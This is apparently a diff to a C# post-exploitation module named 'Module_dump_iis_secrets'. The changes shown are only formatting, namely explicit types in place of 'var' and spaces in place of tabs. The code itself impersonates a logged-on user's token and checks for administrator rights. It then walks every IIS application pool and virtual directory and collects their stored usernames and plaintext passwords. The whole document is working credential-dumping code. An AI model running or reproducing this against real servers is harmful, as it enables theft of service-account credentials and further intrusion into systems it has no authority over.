@@ -36,7 +36,7 @@ public class Module_dump_iis_secrets
 
         if (!ImpersonateLoggedOnUser(targetToken))
         {
-            var errorCode = Marshal.GetLastWin32Error();
+            int errorCode = Marshal.GetLastWin32Error();
             throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
         }
 
@@ -106,7 +106,7 @@ public class Module_dump_iis_secrets
         bool flag = false;
         using(WindowsIdentity identity = WindowsIdentity.GetCurrent())
         {
-            var principal = new WindowsPrincipal(identity);
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
             flag = principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
         return flag;
@@ -127,38 +127,38 @@ public class Module_dump_iis_secrets
             if (!IsHighIntegrity())
                 return new string[]{ERR_CODE, "No High Integrity detected in current context" + Environment.NewLine};
             
-			ServerManager server = new Microsoft.Web.Administration.ServerManager();
-			ApplicationPoolCollection applicationPools = server.ApplicationPools;
-			foreach (ApplicationPool pool in applicationPools)
-			{
-				bool autoStart = pool.AutoStart;
-				string runtime = (pool.ManagedRuntimeVersion != "") ? pool.ManagedRuntimeVersion : "-";
-				string appPoolName = (pool.Name != "") ? pool.Name : "-";
-				ProcessModelIdentityType identityType = pool.ProcessModel.IdentityType;
-				string username = (pool.ProcessModel.UserName != "") ? pool.ProcessModel.UserName : "-";
-				string password = (pool.ProcessModel.Password != "") ? pool.ProcessModel.Password : "-";
-				
+            ServerManager server = new Microsoft.Web.Administration.ServerManager();
+            ApplicationPoolCollection applicationPools = server.ApplicationPools;
+            foreach (ApplicationPool pool in applicationPools)
+            {
+                bool autoStart = pool.AutoStart;
+                string runtime = (pool.ManagedRuntimeVersion != "") ? pool.ManagedRuntimeVersion : "-";
+                string appPoolName = (pool.Name != "") ? pool.Name : "-";
+                ProcessModelIdentityType identityType = pool.ProcessModel.IdentityType;
+                string username = (pool.ProcessModel.UserName != "") ? pool.ProcessModel.UserName : "-";
+                string password = (pool.ProcessModel.Password != "") ? pool.ProcessModel.Password : "-";
+                
                 result += "ApplicationPool" + SEPARATOR;
                 result += runtime + SEPARATOR;
                 result += appPoolName + SEPARATOR;
                 result += "-" + SEPARATOR;
                 result += username + SEPARATOR;
                 result += password + Environment.NewLine;
-			}
+            }
 
-			SiteCollection serverSites = server.Sites;
-			foreach (Site serverSite in serverSites)
-			{
-				ApplicationCollection siteApplications = serverSite.Applications;
+            SiteCollection serverSites = server.Sites;
+            foreach (Site serverSite in serverSites)
+            {
+                ApplicationCollection siteApplications = serverSite.Applications;
                 foreach (Application siteApplication in siteApplications)
-			    {
+                {
                     string appPoolName = (siteApplication.ApplicationPoolName != "") ? siteApplication.ApplicationPoolName : "-";
                     VirtualDirectoryCollection appVirtualDirs = siteApplication.VirtualDirectories;
                     foreach (VirtualDirectory appVirtualDir in appVirtualDirs)
-			        {
+                    {
                         string appVirtualDirName = (appVirtualDir.ToString() != "") ? appVirtualDir.ToString() : "-";
                         string username          = (appVirtualDir.UserName != "") ? appVirtualDir.UserName : "-";
-				        string password          = (appVirtualDir.Password != "") ? appVirtualDir.Password : "-";
+                        string password          = (appVirtualDir.Password != "") ? appVirtualDir.Password : "-";
 
                         result += "VirtualDirectory" + SEPARATOR;
                         result += "-" + SEPARATOR;
@@ -168,7 +168,7 @@ public class Module_dump_iis_secrets
                         result += password + Environment.NewLine;
                     }
                 }
-			}
+            }
         }
         catch (Exception ex)
         {
